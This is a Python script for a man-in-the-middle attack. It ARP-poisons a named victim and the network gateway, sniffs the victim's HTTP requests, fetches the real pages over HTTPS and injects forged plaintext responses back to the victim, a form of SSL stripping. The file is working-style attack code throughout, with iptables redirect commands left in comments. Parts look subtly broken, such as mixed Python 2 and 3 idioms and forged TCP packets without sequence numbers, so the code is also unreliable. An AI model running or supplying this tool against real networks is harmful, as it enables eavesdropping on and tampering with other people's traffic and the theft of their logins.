from arp_poison import ArpPoisoner
from scapy.all import *
import threading
import time
import httplib
import ssl
from utils import get_gateway_ip, network_utils

def run(args):
    interface = args.interface
    victim_ip = args.victim_ip

    # Spoof the gateway router
    gateway_ip = get_gateway_ip.find_gateway_ip()
    args.gateway_ip = gateway_ip
    args.gateway_mac = network_utils.get_mac_address(gateway_ip, interface=args.interface)
    stop_event = threading.Event()

    try:
        # Set up ip tables for rerouting http packets
        #os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")

        poisoner = ArpPoisoner(args)
        arp_poison_thread = threading.Thread(target=poisoner.start)
        arp_poison_thread.setDaemon(True)
        arp_poison_thread.start()

        start_sniffing(interface)

        while not stop_event.is_set():
            time.sleep(0.5)

    except (KeyboardInterrupt, SystemExit):
        print("[-] Interrupted, joining threads...")
        stop_event.set()
        poisoner.stop()

        #os.system("iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")

        arp_poison_thread.join()

def start_sniffing(interface):
    sniff(iface=interface, filter="tcp port 80", store=False, prn=ssl_strip)

def ssl_strip(packet):
    if packet.haslayer(TCP) and packet[IP].dport == 80:
        if packet.haslayer(Raw) and len(packet[Raw].load) > 0:
            try:
                http_request = packet[Raw].load.decode()
                if "Host:" in http_request:
                    lines = http_request.split('\r\n')
                    host_line = next(line for line in lines if "Host:" in line)
                    host = host_line.split(' ')[1]
                    path = lines[0].split(' ')[1]

                    # Make an HTTPS request to the actual server
                    context = ssl.create_default_context()
                    conn = httplib.HTTPSConnection(host, context=context)
                    conn.request("GET", path)
                    https_response = conn.getresponse()

                    # Read the HTTPS response
                    content_type = https_response.getheader('Content-Type')
                    content_length = https_response.getheader('Content-Length')
                    response_body = https_response.read().decode(errors='ignore')

                    # Craft the HTTP response to send to the victim
                    http_response = "HTTP/1.1 200 OK\r\n" \
                                    "Content-Type: {}\r\n" \
                                    "Content-Length: {}\r\n" \
                                    "Cache-Control: public, max-age=31536000\r\n" \
                                    "\r\n" \
                                    "{}".format(content_type, content_length, response_body)

                    # Send the HTTP response to the victim
                    spoofed_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                                       TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="PA") / \
                                       Raw(load=http_response.encode())
                    send(spoofed_response, verbose=False)
                    print("Sent spoofed response")
            except Exception as e:
                print("Error handling packet: {}".format(e))
